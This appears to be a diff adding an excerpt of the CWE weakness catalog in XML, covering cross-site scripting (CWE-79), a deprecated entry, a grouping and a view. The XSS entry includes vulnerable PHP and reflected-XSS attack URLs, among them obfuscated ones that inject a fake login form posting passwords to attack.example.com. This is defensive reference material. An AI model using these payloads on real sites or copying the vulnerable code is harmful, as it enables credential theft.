@@ -1,0 +1,266 @@
+<?xml version='1.0' encoding='utf-8'?>
+<Weakness_Catalog xmlns="http://cwe.mitre.org/cwe-8" xmlns:xhtml="http://www.w3.org/1999/xhtml" Name="CWE" Version="5.0" Date="2026-10-28"><Weaknesses><Weakness ID="79" Name="Improper Neutralization of Input During Web Page Generation" Abstraction="Base" Structure="Simple" Status="Stable" Diagram="/data/images/CWE-79-Diagram.png">
+         <Description>The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.</Description>
+	 <Related_Weaknesses>
+           <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary">
+             <Dimensions>
+               <Dimension Type="Input-Type">Input</Dimension>
+	       <Dimension Type="Technology">Web</Dimension>
+	       <Dimension Type="Resource-Type">Page</Dimension>
+	       <Dimension Type="Behavior-Type">Generation</Dimension>
+               <Dimension Type="Common-Name">Cross-site Scripting</Dimension>
+             </Dimensions>
+	   </Related_Weakness>
+            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary" />
+            <Related_Weakness Nature="CanPrecede" CWE_ID="494" View_ID="1000" />
+            <Related_Weakness Nature="PeerOf" CWE_ID="352" View_ID="1000" />
+         </Related_Weaknesses>
+         <Applicable_Platforms>
+            <Language Class="Not Language-Specific" Prevalence="Undetermined" />
+            <Language Name="Go" Prevalence="Undetermined" />
+	    <Technology Name="AI/ML" Prevalence="Undetermined" />
+            <Technology Class="Web Based" Prevalence="Often" />
+	    <Technology Name="Web Server" Prevalence="Undetermined" />
+         </Applicable_Platforms>
+         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
+         <Common_Consequences>
+            <Consequence>
+               <Scope>Access Control</Scope>
+               <Scope>Confidentiality</Scope>
+               <Impact>Bypass Protection Mechanism</Impact>
+               <Impact>Read Application Data</Impact>
+               <Note>The most common attack performed with cross-site scripting involves the disclosure of private information stored in user cookies, such as session information. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity on behalf of the victim to an attacker-controlled system (such as sending all site cookies to a given E-mail address). This could be especially dangerous to the site if the victim has administrator privileges to manage that site. This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</Note>
+            </Consequence>
+            <Consequence>
+               <Scope>Integrity</Scope>
+               <Scope>Confidentiality</Scope>
+               <Scope>Availability</Scope>
+               <Impact>Execute Unauthorized Code or Commands</Impact>
+               <Note>In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws, for example, "drive-by hacking."</Note>
+            </Consequence>
+            </Common_Consequences>
+         <Demonstrative_Examples>
+            <Demonstrative_Example>
+               <Intro_Text>The following code displays a welcome message on a web page based on the HTTP GET username parameter (covers a Reflected XSS (Type 1) scenario).</Intro_Text>
+               <Example_Code Nature="Bad" Language="PHP">
+                  <xhtml:div>$username = $_GET['username'];<xhtml:br />echo '&lt;div class="header"&gt; Welcome, ' . $username . '&lt;/div&gt;';</xhtml:div>
+               </Example_Code>
+               <Body_Text>Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as</Body_Text>
+               <Example_Code Nature="Attack">
+                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript"&gt;alert("You've been attacked!");&lt;/Script&gt;</xhtml:div>
+               </Example_Code>
+               <Body_Text>This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.</Body_Text>
+               <Body_Text>More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:</Body_Text>
+               <Example_Code Nature="Attack">
+                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword"&gt;Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post"&gt;Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;&lt;input type="submit" value="Login" /&gt;&lt;/form&gt;&lt;/div&gt;</xhtml:div>
+               </Example_Code>
+               <Body_Text>If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:</Body_Text>
+               <Example_Code Nature="Result">
+                  <xhtml:div>&lt;div class="header"&gt; Welcome, &lt;div id="stealPassword"&gt; Please Login:<xhtml:div style="margin-left:1em;">
+                        <xhtml:br />&lt;form name="input" action="attack.example.com/stealPassword.php" method="post"&gt;<xhtml:div style="margin-left:1em;">Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;<xhtml:br />Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;<xhtml:br />&lt;input type="submit" value="Login" /&gt;</xhtml:div>&lt;/form&gt;</xhtml:div>
+                     <xhtml:br />&lt;/div&gt;&lt;/div&gt;</xhtml:div>
+               </Example_Code>
+               <Body_Text>The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):</Body_Text>
+               <Example_Code Nature="Attack">
+                  <xhtml:div>trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22<xhtml:br />stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input<xhtml:br />%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php<xhtml:br />%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text<xhtml:br />%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A<xhtml:br />+%3Cinput+type%3D%22password%22+name%3D%22password%22<xhtml:br />+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22<xhtml:br />+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</xhtml:div>
+               </Example_Code>
+               <Body_Text>The same attack string could also be obfuscated as:</Body_Text>
+               <Example_Code Nature="Attack">
+                  <xhtml:div>trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript"&gt;<xhtml:br />document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073<xhtml:br />\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064<xhtml:br />\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067<xhtml:br />\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D<xhtml:br />\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063<xhtml:br />\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F<xhtml:br />\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D<xhtml:br />\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061<xhtml:br />\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068<xhtml:br />\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070<xhtml:br />\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D<xhtml:br />\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079<xhtml:br />\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061<xhtml:br />\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065<xhtml:br />\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073<xhtml:br />\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075<xhtml:br />\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073<xhtml:br />\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022<xhtml:br />\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E<xhtml:br />\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D<xhtml:br />\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C<xhtml:br />\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F<xhtml:br />\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script&gt;</xhtml:div>
+               </Example_Code>
+               <Body_Text>Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.</Body_Text>
+            </Demonstrative_Example>
+            </Demonstrative_Examples>
+         <Observed_Examples>
+            <Observed_Example>
+               <Reference>CVE-2024-49038</Reference>
+               <Description>XSS in AI assistant</Description>
+               <Link>https://www.cve.org/CVERecord?id=CVE-2024-49038</Link>
+            </Observed_Example>
+            <Observed_Example>
+               <Reference>CVE-2024-54142</Reference>
+               <Description>Plugin that enables AI features allows input with html entities, leading to XSS</Description>
+               <Link>https://www.cve.org/CVERecord?id=CVE-2024-54142</Link>
+            </Observed_Example>
+            </Observed_Examples>
+         <Related_Attack_Patterns>
+            <Related_Attack_Pattern CAPEC_ID="209" />
+            <Related_Attack_Pattern CAPEC_ID="588" />
+            <Related_Attack_Pattern CAPEC_ID="591" />
+            </Related_Attack_Patterns>
+         <Mapping_Notes>
+            <Usage>Allowed</Usage>
+            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
+            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
+            <Reasons>
+               <Reason Type="Acceptable-Use" />
+            </Reasons>
+         </Mapping_Notes>
+         <Content_History>
+            <Submission>
+               <Submission_Name>PLOVER</Submission_Name>
+               <Submission_Date>2006-07-19</Submission_Date>
+               <Submission_Version>Draft 3</Submission_Version>
+               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
+            </Submission>
+            <Modification>
+               <Modification_Name>Eric Dalci</Modification_Name>
+               <Modification_Organization>Cigital</Modification_Organization>
+               <Modification_Date>2008-07-01</Modification_Date>
+			   <Modification_Version>1.0</Modification_Version>
+			   <Modification_ReleaseDate>2008-09-09</Modification_ReleaseDate>
+               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
+            </Modification>
+            <Modification>
+               <Modification_Organization>Veracode</Modification_Organization>
+               <Modification_Date>2008-08-15</Modification_Date>
+			   <Modification_Version>1.0</Modification_Version>
+			   <Modification_ReleaseDate>2008-09-09</Modification_ReleaseDate>
+               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
+            </Modification>
+            </Content_History>
+      </Weakness>
+      <Weakness ID="1187" Name="DEPRECATED: Use of Uninitialized Resource" Abstraction="Base" Structure="Simple" Status="Deprecated">
+         <Description>This entry has been deprecated because it was a duplicate of CWE-908. All content has been transferred to CWE-908.</Description>
+         <Mapping_Notes>
+            <Usage>Prohibited</Usage>
+            <Rationale>This CWE has been deprecated.</Rationale>
+            <Comments>See description and name for possible suggestions of other CWEs to consider.</Comments>
+            <Reasons>
+               <Reason Type="Deprecated" />
+            </Reasons>
+         </Mapping_Notes>
+         <Content_History>
+            <Submission>
+               <Submission_Name>CWE Content Team</Submission_Name>
+               <Submission_Organization>MITRE</Submission_Organization>
+               <Submission_Date>2019-03-25</Submission_Date>
+               <Submission_Version>3.3</Submission_Version>
+               <Submission_ReleaseDate>2019-06-20</Submission_ReleaseDate>
+            </Submission>
+				<Modification>
+					<Modification_Name>CWE Content Team</Modification_Name>
+					<Modification_Organization>MITRE</Modification_Organization>
+					<Modification_Date>2020-02-24</Modification_Date>
+					<Modification_Version>4.0</Modification_Version>
+					<Modification_ReleaseDate>2020-02-24</Modification_ReleaseDate>
+					<Modification_Comment>updated Description, Name, Relationships, Type, Weakness_Ordinalities</Modification_Comment>
+				</Modification>
+				<Modification>
+					<Modification_Name>CWE Content Team</Modification_Name>
+					<Modification_Organization>MITRE</Modification_Organization>
+					<Modification_Date>2023-06-29</Modification_Date>
+					<Modification_Version>4.12</Modification_Version>
+					<Modification_ReleaseDate>2023-06-29</Modification_ReleaseDate>
+					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
+				</Modification>
+			<Previous_Entry_Name Date="2020-02-24">Use of Uninitialized Resource</Previous_Entry_Name>
+         </Content_History>
+      </Weakness>
+      </Weaknesses><Groupings><Grouping ID="1001" Name="SFP Secondary Cluster: Use of an Improper API" Status="Incomplete">
+         <Summary>This category identifies Software Fault Patterns (SFPs) within the Use of an Improper API cluster (SFP3).</Summary>
+         <Relationships>
+            <Has_Member CWE_ID="111" View_ID="888" />
+            <Has_Member CWE_ID="227" View_ID="888" />
+            </Relationships>
+         <Mapping_Notes>
+            <Usage>Prohibited</Usage>
+            <Rationale>This entry is a Grouping. Using groupings for mapping has been discouraged since 2019. They are informal organizational groupings of weaknesses that can help CWE users with data aggregation, navigation, and browsing. However, they are not weaknesses in themselves.</Rationale>
+            <Comments>See member weaknesses of this category.</Comments>
+            <Reasons>
+               <Reason Type="Grouping" />
+            </Reasons>
+         </Mapping_Notes>
+         <Content_History>
+            <Submission>
+               <Submission_Name>CWE Content Team</Submission_Name>
+               <Submission_Organization>MITRE</Submission_Organization>
+               <Submission_Date>2014-07-29</Submission_Date>
+               <Submission_Version>2.8</Submission_Version>
+               <Submission_ReleaseDate>2014-07-31</Submission_ReleaseDate>
+            </Submission>
+				<Modification>
+					<Modification_Name>CWE Content Team</Modification_Name>
+					<Modification_Organization>MITRE</Modification_Organization>
+					<Modification_Date>2020-02-24</Modification_Date>
+					<Modification_Version>4.0</Modification_Version>
+					<Modification_ReleaseDate>2020-02-24</Modification_ReleaseDate>
+					<Modification_Comment>updated Description</Modification_Comment>
+				</Modification>
+				<Modification>
+					<Modification_Name>CWE Content Team</Modification_Name>
+					<Modification_Organization>MITRE</Modification_Organization>
+					<Modification_Date>2023-04-27</Modification_Date>
+					<Modification_Version>4.11</Modification_Version>
+					<Modification_ReleaseDate>2023-04-27</Modification_ReleaseDate>
+					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
+				</Modification>
+				<Modification>
+					<Modification_Name>CWE Content Team</Modification_Name>
+					<Modification_Organization>MITRE</Modification_Organization>
+					<Modification_Date>2023-06-29</Modification_Date>
+					<Modification_Version>4.12</Modification_Version>
+					<Modification_ReleaseDate>2023-06-29</Modification_ReleaseDate>
+					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
+				</Modification>
+				<Modification>
+					<Modification_Name>CWE Content Team</Modification_Name>
+					<Modification_Organization>MITRE</Modification_Organization>
+					<Modification_Date>2026-10-28</Modification_Date>
+					<Modification_Version>5.0</Modification_Version>
+					<Modification_ReleaseDate>2026-10-28</Modification_ReleaseDate>
+					<Modification_Comment>updated Mapping_Notes, Type</Modification_Comment>
+				</Modification>
+         </Content_History>
+      </Grouping>
+      </Groupings><Views><View ID="1000" Name="Complete Weakness Hierarchy" Type="Graph" Status="Draft">
+         <Objective>This view has a hierarchical organization of all weaknesses within CWE. It is intended to facilitate research into weaknesses, including their inter-dependencies, and can be leveraged to systematically identify theoretical gaps within CWE. It is mainly organized according to abstractions of behaviors and other dimensions instead of how the weaknesses can be detected or mitigated, where they appear in code, or when they are introduced in the development life cycle. By design, this view is expected to include every weakness within CWE.</Objective>
+         <Audience>
+            <Stakeholder>
+               <Type>Academic Researchers</Type>
+               <Description>Academic researchers can use the high-level classes that lack a significant number of children to identify potential areas for future research.</Description>
+            </Stakeholder>
+            <Stakeholder>
+               <Type>Vulnerability Analysts</Type>
+               <Description>Those who perform vulnerability discovery/analysis use this view to identify related weaknesses that might be leveraged by following relationships between higher-level classes and bases.</Description>
+            </Stakeholder>
+            <Stakeholder>
+               <Type>Assessment Tool Vendors</Type>
+               <Description>Assessment vendors often use this view to help identify additional weaknesses that a tool may be able to detect as the relationships are more aligned with a tool's technical capabilities.</Description>
+            </Stakeholder>
+            <Stakeholder>
+               <Type>Product Vendors</Type>
+               <Description>Product vendors can use this view to assist with mapping vulnerabilities to their root-cause weaknesses.</Description>
+            </Stakeholder>
+         </Audience>
+         <Members>
+            <Has_Member CWE_ID="284" View_ID="1000" />
+            <Has_Member CWE_ID="435" View_ID="1000" />
+            </Members>
+         <Mapping_Notes>
+            <Usage>Prohibited</Usage>
+            <Rationale>This entry is a View. Views are not weaknesses and therefore inappropriate to describe the root causes of vulnerabilities.</Rationale>
+            <Comments>Use this View or other Views to search and navigate for the appropriate weakness.</Comments>
+            <Reasons>
+               <Reason Type="View" />
+            </Reasons>
+         </Mapping_Notes>
+         <Content_History>
+            <Submission>
+                <Submission_Name>CWE Content Team</Submission_Name>
+				<Submission_Organization>MITRE</Submission_Organization>
+                <Submission_Date>2008-04-11</Submission_Date>
+                <Submission_Version>Draft 9</Submission_Version>
+                <Submission_ReleaseDate>2008-04-11</Submission_ReleaseDate>
+            </Submission>
+            <Modification>
+               <Modification_Name>CWE Content Team</Modification_Name>
+               <Modification_Organization>MITRE</Modification_Organization>
+               <Modification_Date>2008-09-08</Modification_Date>
+               <Modification_Version>1.0</Modification_Version>
+               <Modification_ReleaseDate>2008-09-09</Modification_ReleaseDate>
+               <Modification_Comment>updated Description, Name, Relationships, View_Audience, View_Structure</Modification_Comment>
+            </Modification>
+            </Content_History>
+      </View>
+      </Views></Weakness_Catalog>
